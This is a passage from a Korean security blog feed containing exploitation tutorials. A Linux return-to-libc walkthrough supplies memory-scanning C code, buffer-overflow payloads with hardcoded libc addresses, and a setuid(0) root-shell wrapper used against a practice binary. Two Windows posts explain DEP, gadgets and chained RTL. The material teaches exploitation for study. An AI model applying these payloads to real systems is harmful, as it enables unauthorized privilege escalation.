+&lt;p&gt;이제 /bin/sh의 주소를 구해야 합니다. 실제로는 /lib/libc.so.6 라이브러리 파일 내의 /bin/sh와 system 의 오프셋을 구해서 최종적인 문자열 주소를 찾을수 있지만 아래의 반복문을 통해서 쉽게 구해보겠습니다.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01 #include &amp;lt;stdio.h&amp;gt;
+02 
+03 int main(){
+04   long shell=0x4203f2c0; //system()의 주소를 입력해 주시면 됩니다.
+05 	 while(memcmp((void*)shell,(&quot;/bin/sh&quot;),8))
+06   shell++; 
+07 	 printf(&quot;%p\n&quot;,shell);
+08 }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;코드의 중요 라인인 5라인만 설명 드리자면 &lt;strong&gt;memcmp&lt;/strong&gt; 함수를 사용해서 &lt;strong&gt;바이트 데이터를 비교&lt;/strong&gt; 하는 과정입니다. &lt;strong&gt;memcmp(인자1, 인자2, 사이즈)&lt;/strong&gt;의 기본형을 가지며 &lt;strong&gt;인자 1&lt;/strong&gt;의 첫 바이트와 &lt;strong&gt;인자 2&lt;/strong&gt;의 첫 바이트를 &lt;strong&gt;사이즈&lt;/strong&gt; 만큼 비교하는 것이며, 이 과정을 통해서 &lt;strong&gt;system()내부에 /bin/sh 문자열을&lt;/strong&gt; 찾아내며 결과적으로 &lt;strong&gt;주소값으로 리턴&lt;/strong&gt; 해줍니다. 돌려줍시다~&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-6.png&quot; alt=&quot;[그림 4-6]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = &lt;strong&gt;0x4203f2c0&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = &lt;strong&gt;0x42127ea4&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;최종적으로 system() 과 /bin/sh 의 주소값을 찾아냈습니다. 이제 찾아낸 정보를 바탕으로 공격 페이로드를 작성해 보겠습니다.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 `python -c 'print &quot;AAAA&quot;*11 + &quot;\xc0\xf2\x03\x42&quot; + &quot;AAAA&quot; + &quot;\xa4\x7e\x12\x42&quot;'`
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;마지막으로 페이로드를 정리 하고 직접 때려보도록 하겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-7.png&quot; alt=&quot;[그림 4-7]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;먼저 버버 크기(40byte)와 sfp(4byte) 를 채워 주고 공유 라이브러리에 위치한 system() 함수를 저장시킵니다. 다음 위치에는 AAAA의 4byte를 채워 줍니다. 이유는 위에서 알려 드렸듯 system()의 인자값은 8byte 뒤에 위치하기에 그 거리만큼 벌려 주고 우리가 필요로 하는 /bin/sh을 위치 시켜 줌으로서 system()이 인자값으로 /bin/sh을 정상적으로 받을수 있게 설계해준겁니다.&lt;/p&gt;
+
+&lt;p&gt;설명은 이쯤 해두고 직접 떄려보도록 하겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-8.png&quot; alt=&quot;[그림 4-8]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;shell이 떨어지네요. 지금 한 방식처럼 system() 내부의 /bin/sh 문자열을 찾는 방법도 있고 전 포스팅에서 했던 환경변수를 이용 하는 방법도 있습니다. 빠르게 보고 넘어가죠.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-9.png&quot; alt=&quot;[그림 4-9]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;위에서 설명 드렸듯 bof라는 환경변수에 /bin/sh 문자열을 저장하고 해당 환경변수의 주소를 확인합니다. 아래쪽은 bof 환경변수의 동작 여부를 확인 했습니다.&lt;/p&gt;
+
+&lt;p&gt;system()의 주소는 알고 있으니 환경변수의 주소만 추가해서 바로 페이로드를 작성하고 떄려봅시다&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-10.png&quot; alt=&quot;[그림 4-10]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;shell은 마찬가지로 잘 떨어집니다만…우리가 원하는 root 권한이 아니라서 아쉽습니다…..ㅠ 아쉬움을 달래봅시다.&lt;/p&gt;
+
+&lt;p&gt;우선 system()의 근본적인 문제를 알아 봅시다.&lt;/p&gt;
+
+&lt;p&gt;system()의 경우 내부적으로 &lt;strong&gt;/bin/sh -c argument&lt;/strong&gt;를 실행합니다.
+따라서 &lt;strong&gt;/bin/sh -c /bin/sh&lt;/strong&gt; 로 처리가 되며, root 권한을 얻는것은 system()의 내부에서 /bin/sh를 실행 후 다시 /bin/sh을 실행하기에 불가능합니다. 
+따라서 &lt;strong&gt;setuid()&lt;/strong&gt;함수 를 0으로 셋팅해주고 system()가 실행되도록 하여 &lt;strong&gt;미리 실행전에 root 권한으로 준비시킨 후 system()을 실행&lt;/strong&gt;시킨다면 가능하며 system() 함수의 주소가 아닌 다른 함수가 필요한데 그것이 &lt;strong&gt;execl()&lt;/strong&gt;함수입니다.
+먼저 setuid()를 셋팅해 줄 소스부터 작성 해보겠습니다.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01 #include &amp;lt;stdio.h&amp;gt;
+02 
+03 int main(){
+04   setuid(0);
+05 	 system(&quot;/bin/sh&quot;);
+06   return 0;
+07 }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;해당 파일을 컴파일해주시고 마찬가지로 환경변수에 저장 해줍니다. execl()의 주소도 위에서 system() 주소값을 찾았던 방식으로 찾아주시면 됩니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-11.png&quot; alt=&quot;[그림 4-11]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;execl()&lt;/strong&gt; 주소 = &lt;strong&gt;0x420acaa0&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;새로 작성한 &lt;strong&gt;/tmp/bof1/rootsh&lt;/strong&gt; 주소 = &lt;strong&gt;??&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;이제 페이로드를 짜야 하는데 한가지 주의점은 execl()은 끝에 null로 끝나야 합니다.
+execl(const char *path, const char *arg0, const char *arg1, const char *arg2,…const char *argn, (char *)0);의 형태로 구성 되있는데 조금더 보기 쉽게 하자면
+execl(경로, 인자1, 인자2….인자n, null) 이라고 이해하시면 됩니다. 마지막은 인자의 끝을 의미로 null값이 위치하게 됩니다.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 `python -c 'print &quot;AAAA&quot;*11 + &quot;execl주소&quot; + &quot;AAAA&quot; + &quot;rootsh 주소&quot;'`
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;공격 페이로드는 위와 같이 구성 될것입니다.&lt;/p&gt;
+
+&lt;p&gt;페이로드 전에 execl()을 사용하기 위해 메모리 상태를 봐야합니다. 이유는 끝이 null값으로 끝나는 적당한 지점을 골라야 하기 때문입니다. 직접 보는게 이해하기 빠를겁니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-12.png&quot; alt=&quot;[그림 4-12]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;위에서 그림과 같이 BBBB는 execl()의 주소가 되며(파란색) CCCC는 불필요한 값이며(초록색) DDDD가 새로 작성한 rootsh의 주소(노란색)가 됩니다. 위에서 execl()의 인자값의 형태를 봤습니다. 경로 + 인자1 + 인자2 +인자n + NULL의 형태를 띄우며 DDDD 하나는 경로에 들어가며 DDDD가 하나더 들어가면 인자 1에 들어갑니다. 그렇다는 것은 마지막이 마지막으로 DDDD의 뒤의 한 바이트는 NULL이 되어야 4바이트가 전부 NULL로 자리를 잡게 됩니다. 다음 그림과 위 그림의 하늘색 박스의 1byte값인 2c를 확인해보면 무슨 말인지 이해 되실거라 생각 됩니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-13.png&quot; alt=&quot;[그림 4-13]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;상단에 입력한 페이로드를 보면 DDDD를 &lt;em&gt;2 했으며 아래쪽에 하늘색 박스가 2c가 아닌 00으로 바뀌었음을 확인 간으합니다. 즉 DDDD DDDD가 들어간 다음 1byte는 NULL로 바꾸게 됩니다. 이제 DDDD&lt;/em&gt;3을 입력하여 우리가 원하는 0xbffffe4a0(보라색)의 값이 바뀌는지 확인하도록 합시다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-14.png&quot; alt=&quot;[그림 4-14]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;우리가 원하는 모양으로 메모리 값이 바뀌는걸 확인 했으니 페이로드를 다시 정리 해보겠습니다.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 &quot;`python -c 'print &quot;AAAA&quot;*11 + &quot;\xa0\xca\x0a\x42&quot; + &quot;AAAA&quot; + &quot;rootsh 주소&quot;*3'`&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;이제 rootsh 의 주소를 알아내고 *3만 붙여주면 될 듯 합니다. 고지가 보이네요.&lt;/p&gt;
+
+&lt;p&gt;위에서 작성하고 컴파일한 rootsh를 주소가 변하지않는 값을 찾아서 심볼릭 링크를 걸어줘야 합니다. 변하지 않는 곳은 Data segment 영역입니다.&lt;/p&gt;
+
+&lt;p&gt;Data segment 영역의 주소는 0x08049000 부터 시작합니다. 해당 주소를 dbg를 이용해서 열어보도록 하겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-15.png&quot; alt=&quot;[그림 4-15]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;0x08049014 주소의 값이 0x01(=0x00000001)을 갖고있습니다. 다른 값을 쓰셔도 됩니다만 입력에 있어서 편안한 간단한 값을 선택 합니다. 0x08049014 = 0x01 이라는것을 알아 두시면 됩니다. 이제 rootsh 코드와 0x01의 주소를 심볼릭 링크 시켜줍니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-16.png&quot; alt=&quot;[그림 4-16]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;자 이제 준비가 끝났습니다. 위에서 찾아본 내용을 바탕으로 페이로드를 재구성 해보겠습니다.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;execl()&lt;/strong&gt; 주소 = &lt;strong&gt;0x420acaa0&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;/tmp/bof1/rootsh 심볼릭 링크 주소&lt;/strong&gt; = &lt;strong&gt;0x08049014&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;[AAAA(44byte)] + [execl() 주소] + [잉여값(4byte)] + [rootsh sl 주소] 과 구성되며 실제 공격 페이로드는 아래와 같습니다.(공격 페이로드는 root 권한의 파일을 대상으로 확인하셔야 합니다.)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;../bof/bof1 &quot;`python -c 'print &quot;AAAA&quot;*11 + &quot;\xa0\xca\x0a\x42&quot; + &quot;AAAA&quot; 
++ &quot;\x14\x90\x04\x08&quot;*3'`&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;이때 주의할 점은 페이로드 전체를 ““로 감싸야 합니다. \x0a를 \x00으로 인식하는 문제가 있어서 “&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'print .......'&lt;/code&gt;” 이런식로 감싸주셔야 똑바로 값이 들어갑니다. 꼭 ““으로 감싸주세요!&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-17.png&quot; alt=&quot;[그림 4-17]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;짜잔….개…root 권한으로 shell을 땄습니다. 
+이번에도 역시나 간단하게 하고 싶었는데 고생도 하느라 이것저것 실수 했던것들 다 담느라 많이 길어졌네요…..ㅂㄷㅂㄷ….&lt;/p&gt;
+
+&lt;p&gt;RTL이란 기법은 나중에 알아볼 ROP를 위한 초석입니다. 꼭 잘 숙지 해주셔야 합니다….. :(&lt;/p&gt;
+
+&lt;p&gt;다음 포스팅은 Chaining RTL이란 것을 정말…간단히 볼 수 있도록 해보겠습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;뿅!&lt;/strong&gt;&lt;/p&gt;</content><author><name>Sulla</name></author><category term="Posts" /><summary type="html">RTL(Return to Library)</summary></entry><entry><title type="html">windows-0x08</title><link href="/windows-0x08" rel="alternate" type="text/html" title="windows-0x08" /><published>2019-03-19T20:18:00+09:00</published><updated>2019-03-19T20:18:00+09:00</updated><id>/windows-0x08</id><content type="html" xml:base="/windows-0x08">&lt;h1 id=&quot;0x08-dep2&quot;&gt;0x08 DEP(2)&lt;/h1&gt;
+
+&lt;h5 id=&quot;what-is-dep&quot;&gt;What is DEP?&lt;/h5&gt;
+
+&lt;p&gt;지난 Post에서 RTL을 다루어 봤습니다.&lt;/p&gt;
+
+&lt;p&gt;이번 시간에는 RTL에 이어 Chaining RTL에 대해 알아보도록 하겠습니다.&lt;/p&gt;
+
+&lt;h5 id=&quot;chaining-rtl&quot;&gt;Chaining RTL&lt;/h5&gt;
+
+&lt;p&gt;Chaining RTL은 RTL이 Chain처럼 엮여서 반복되는 것을 말합니다.&lt;/p&gt;
+
+&lt;p&gt;RTL이 뭐였죠? DEP가 적용되어 Shellcode를 실행할 수 없게 되었을 때, 라이브러리 함수로 점프하여&lt;/p&gt;
+
+&lt;p&gt;내가 원하는 함수를 실행하는 것이었죠?&lt;/p&gt;
+
+&lt;p&gt;Chaining RTL은 말 그대로 내가 원하는 함수를 계속해서 실행하는 것을 뜻합니다.&lt;/p&gt;
+
+&lt;p&gt;의미는 알았으니, 본격적으로 알아볼텐데 STACK 구성에 집중해서 보시면 되겠습니다.&lt;/p&gt;
+
+&lt;p&gt;먼저, 지난 시간처럼 몇 가지 가정을 하겠습니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;func1(argv1) : 인자를 하나만 필요로 하는 함수&lt;/li&gt;
+  &lt;li&gt;func2(argv1’, argv’2) : 인자를 두 개 필요로 하는 함수&lt;/li&gt;
+  &lt;li&gt;func3(argv’‘1, argv’‘2, argv’‘3) : 인자를 세 개 필요로 하는 함수&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;이 함수들을 차례대로 호출한다고 가정하고 이 때, Payload를 어떻게 구성해야하는 것인지를 살펴보도록 하겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_2.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;이 그림 기억나시나요?? 지난 시간에 살펴봤던 함수를 하나만 호출할 때의 STACK 그림입니다.&lt;/p&gt;
+
+&lt;p&gt;Main-ret가 다음 호출할 함수의 SFP로 변경되고 있죠? 그래서 그 다음 4 Byte가 호출된 함수가 종료되고 다음에 갈 곳의 주소인 것도 알고 있습니다.&lt;/p&gt;
+
+&lt;p&gt;그럼 두 번째 함수(인자가 두 개)를 호출할 때 그림이 이렇게 되겠네요?&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x08_1.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Func1() 함수의 RET 자리에 Func2() 함수의 주소를 넣어줬습니다. 그럼 Func1() 함수가 종료된 후, Func2() 함수가 실행됩니다.&lt;/p&gt;
+
+&lt;p&gt;간단하죠?&lt;/p&gt;
+
+&lt;p&gt;그런데 여기엔 문제가 있습니다. 이 방법으로는 내가 원하는 함수를 마음껏 호출할 수가 없습니다.&lt;/p&gt;
+
+&lt;p&gt;그냥 RET에 다른 함수 주소를 덮어주면 되는거 아니야? 라고 생각하실 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;자, 그럼 다음에 Func3() 함수를 호출한다고 생각해봅시다.&lt;/p&gt;
+
+&lt;p&gt;Func3() 함수의 주소는 어디에 넣어줘야 하죠?&lt;/p&gt;
+
+&lt;p&gt;이미 Func1() 함수의 첫 번째 인자가 위치하고 있습니다. 이제 이해가 가시죠??&lt;/p&gt;
+
+&lt;p&gt;이 한계를 해결하기 위해 지금부터는 Gadget을 사용할 겁니다.&lt;/p&gt;
+
+&lt;p&gt;RET로 끝나는 많고 많은 Gadget 중에 시스템 해킹에서 주로 사용되는 Gadget은 다음 3가지 입니다.
+(이것만 쓴다는 게 아닙니다!!)&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;pr : POP RET&lt;/li&gt;
+  &lt;li&gt;ppr : POP POP RET&lt;/li&gt;
+  &lt;li&gt;pppr : POP POP POP RET&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;POP 뒤에 Operand는 생략했습니다.&lt;/p&gt;
+
+&lt;p&gt;이 Gadget을 이용해서 내가 원하는만큼 함수를 호출하려면 STACK을 다음과 같이 구성하면 됩니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x08_2.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;조금 이상하고 복잡한 듯이 느껴질 수 있는데, 에필로그 과정부터 Gadget 순으로 색깔별로 보시면 됩니다.&lt;/p&gt;
+
+&lt;p&gt;먼저 에필로그부터 살펴보겠습니다.&lt;/p&gt;
+
+&lt;p&gt;RETN이 실행되면 POP EIP, JMP EIP를 수행하므로 실행되고 난 후, ESP의 위치는 빨간 ESP 위치가 됩니다.&lt;/p&gt;
+
+&lt;p&gt;JMP EIP가 실행되면 POP RETN이 실행되겠죠?&lt;/p&gt;
+
+&lt;p&gt;처음 POP이 실행되면 STACK 최상단의 값을 꺼내고 ESP가 올라가면서 ESP의 위치는 파란 ESP 위치가 됩니다.&lt;/p&gt;
+
+&lt;p&gt;다시 RETN이 실행되면 POP EIP, JMP EIP가 실행되겠네요.&lt;/p&gt;
+
+&lt;p&gt;그럼 그 때의 ESP는 초록색 위치가 되는데 POP EIP를 했으므로 EIP엔 두 번째 함수 Func2()의 주소가 들어가게 될 것이고&lt;/p&gt;
+
+&lt;p&gt;JMP EIP를 하면서 Func2() 함수가 실행됩니다.&lt;/p&gt;
+
+&lt;p&gt;세 번째 함수까지 모두 호출한다고 가정했을 때, STACK의 구조는 다음과 같이 됩니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x08_3.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;이런 식으로 STACK을 구성해서 내가 원하는 함수를 계속해서 호출하는 기법을 Chaining RTL이라고 부릅니다.&lt;/p&gt;
+
+&lt;p&gt;자, 이제 ROP를 하기 위한 기초 준비 작업을 모두 마쳤습니다.&lt;/p&gt;
+
+&lt;p&gt;다음 Post에서 ROP를 알아보고 DEP편을 마무리 짓도록 하겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x08 DEP(2)</summary></entry><entry><title type="html">windows-0x07</title><link href="/windows-0x07" rel="alternate" type="text/html" title="windows-0x07" /><published>2019-03-19T19:18:00+09:00</published><updated>2019-03-19T19:18:00+09:00</updated><id>/windows-0x07</id><content type="html" xml:base="/windows-0x07">&lt;h1 id=&quot;0x07-dep1&quot;&gt;0x07 DEP(1)&lt;/h1&gt;
+
+&lt;h5 id=&quot;what-is-dep&quot;&gt;What is DEP?&lt;/h5&gt;
+
+&lt;p&gt;DEP는 특정 메모리의 실행 권한을 제거하여, 메모리에 올라온 Shellcode의 실행을 막는 메모리 보호 기법입니다.&lt;/p&gt;
+
+&lt;p&gt;DEP는 Window XP Service Pack 2에서부터 적용된 기법이며, H/W 기반 DEP와 S/W 기반 DEP로 나눌 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;이 두 가지 방식의 차이는 CPU가 하드웨어적으로 DEP를 지원 가능한가를 기준으로 나뉜다고 생각하시면 됩니다.&lt;/p&gt;
+
+&lt;p&gt;CPU에서 지원 가능한 경우 H/W DEP라 하고, 그렇지 않은 경우 S/W로 그 기능을 지원하는 방식인 것이죠.&lt;/p&gt;
+
+&lt;p&gt;최근 나온 CPU들은 대부분 H/W 기능을 지원하므로 일반적으로 DEP라고 하면 H/W DEP라고 생각하시면 됩니다.&lt;/p&gt;
+
+&lt;p&gt;DEP에는 아래와 같이 4가지 종류의 옵션이 존재합니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;OptIn : 지정된 Binary만 보호&lt;/li&gt;
+  &lt;li&gt;OptOut : 지정된 Binary를 제외하고 보호&lt;/li&gt;
+  &lt;li&gt;AlwaysOn : 모든 Process 항상 보호&lt;/li&gt;
+  &lt;li&gt;AlwaysOff : 모든 Process 보호하지 않음&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;OS를 설치한 후, 직접 변경한 적이 없다면 Default로 OptIn 옵션이 적용되어 있고 다음과 같이 확인할 수 있습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;DEP가 적용되면 Shellcode를 STACK에 넣어서 실행해왔던 지금까지의 방법으로는 성공할 수가 없게 됩니다.&lt;/p&gt;
+
+&lt;p&gt;하지만 이 기법 역시 우회가 가능하며, DEP를 우회하기 위해 필요한 기법과 개념들은 다음과 같습니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Gadget&lt;/li&gt;
+  &lt;li&gt;RTL&lt;/li&gt;
+  &lt;li&gt;Chaining RTL&lt;/li&gt;
+  &lt;li&gt;ROP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;지금부터 하나씩 살펴보겠습니다.&lt;/p&gt;
+
+&lt;h5 id=&quot;gadget&quot;&gt;Gadget&lt;/h5&gt;
+
+&lt;p&gt;Gadget이란 “mov esp, ebp” 등의 명령어 조각을 의미했었습니다.&lt;/p&gt;
+
+&lt;p&gt;하지만 지금 시스템 해킹에서의 Gadget은 RET로 끝나는 명령어 조각을 의미하게 되었습니다.&lt;/p&gt;
+
+&lt;p&gt;이 Gadget이 공격에서 왜 중요한지는 Chaining RTL과 ROP를 다루면서 이야기하겠습니다.&lt;/p&gt;
+
+&lt;h5 id=&quot;rtl&quot;&gt;RTL&lt;/h5&gt;
+
+&lt;p&gt;RTL은 Return to Library의 약자로 해석을 하면 Library로 돌아간다는 의미입니다.&lt;/p&gt;
+
+&lt;p&gt;Library로 돌아간다?&lt;/p&gt;
+
+&lt;p&gt;아까 앞에서 DEP가 적용되면 Shellcode를 실행할 수가 없다고 했었던 것 기억나시죠?&lt;/p&gt;
+
+&lt;p&gt;그래서 RET를 Shellcode의 주소로 변조하는 것이 아니라, 실행 권한이 있을 수 밖에 없는 Library의 함수의 주소로 변조하는 것이죠.&lt;/p&gt;
+
+&lt;p&gt;그리고!!!&lt;/p&gt;
+
+&lt;p&gt;RTL에서 가장 중요한 것은 함수의 인자를 직접 생성해야 한다는 것입니다.&lt;/p&gt;
+
+&lt;p&gt;Shellcode를 실행했을 때와는 다르게 이 방법은 RET 주소를 원하는 함수의 주소로 바꿔줬을 뿐이기 때문이죠.&lt;/p&gt;
+
+&lt;p&gt;그 함수가 실행되기 위해서는 함수의 동작에 필요한 인자들이 있어야하겠죠?&lt;/p&gt;
+
+&lt;p&gt;CPU가 알아서 자동으로 만들어 줄리가 없으니,,STACK에 직접 구성해줘야 합니다.&lt;/p&gt;
+
+&lt;p&gt;인자를 1개만 취하는 함수 Func()가 있다고 가정하겠습니다.&lt;/p&gt;
+
+&lt;p&gt;RTL 기법으로 이 함수를 호출하기 위해서는 STACK을 다음과 같이 구성해야 합니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;위 그림에서 중간 STACK 그림을 보면 Func을 호출하기 위해 RET를 Func 함수의 주소로 변조하고, 그 위치에서 +8만큼 떨어진 곳에 함수의 인자를 구성한 것을 확인할 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;그런데 왜 인자의 위치를 저렇게 구성해줘야 할까요?&lt;/p&gt;
+
+&lt;p&gt;다음 그림을 보면서 설명해보겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;빨간 색으로 표시된 부분은 Main 함수의 에필로그 과정, 파란 색으로 표신된 부분은 Func 함수의 프롤로그 과정을 나타낸 것 입니다.&lt;/p&gt;
+
+&lt;p&gt;먼저, 빨간 색. Main 함수의 에필로그 과정을 봅시다.&lt;/p&gt;
+
+&lt;p&gt;POP EIP, JMP EIP를 코드를 수행했을 때의 위치가 가장 왼쪽 STACK에 표시된 ESP가 가르키는 곳 입니다.&lt;/p&gt;
+
+&lt;p&gt;이후, JMP EIP 코드가 실행되면 새로운 함수가 실행되고 새 함수의 프롤로그 과정이 진행됩니다.&lt;/p&gt;
+
+&lt;p&gt;프롤로그 과정의 일부인 PUSH EBP가 실행되면 새 STACK Frame의 기준점을 만듭니다.&lt;/p&gt;
+
+&lt;p&gt;여기까지 진행된 후, STACK을 살펴봅시다.&lt;/p&gt;
+
+&lt;p&gt;Main 함수의 RET가 뒤이어 실행되는 함수의 SFP 자리로 바뀐다는 것을 알 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;그리고 그 다음에, RET를 만들어주었습니다.&lt;/p&gt;
+
+&lt;p&gt;RTL이 아니라 정상적인 방식인 CALL을 통해 함수가 실행된다면 STACK에 다음에 실행할 곳의 위치를 넣어줍니다.&lt;/p&gt;
+
+&lt;p&gt;그런데 우리는 컴파일러가 만들어주는 것이 아니기 때문에 직접 만들어줘야 합니다.&lt;/p&gt;
+
+&lt;p&gt;그래서 저 위치에 다음에 실행할 곳의 주소 역할을 할 값을 직접 넣어 구성해주는 것 입니다.&lt;/p&gt;
+
+&lt;p&gt;쉽게 생각하면 컴파일러가 만들어주는 구조를 똑같이 흉내낸다고 생각하시면 되겠습니다.&lt;/p&gt;
+
+&lt;p&gt;이것이 RTL의 전부입니다.&lt;/p&gt;
+
+&lt;p&gt;다음은 디버거를 통해 RTL을 진행한 그림입니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;잘 실행이 되네요^^&lt;/p&gt;
+
+&lt;p&gt;그런데 이 방식은 실제 환경에서는 거의 불가능한 방법이라는 것도 알아두셔야 합니다.&lt;/p&gt;
+
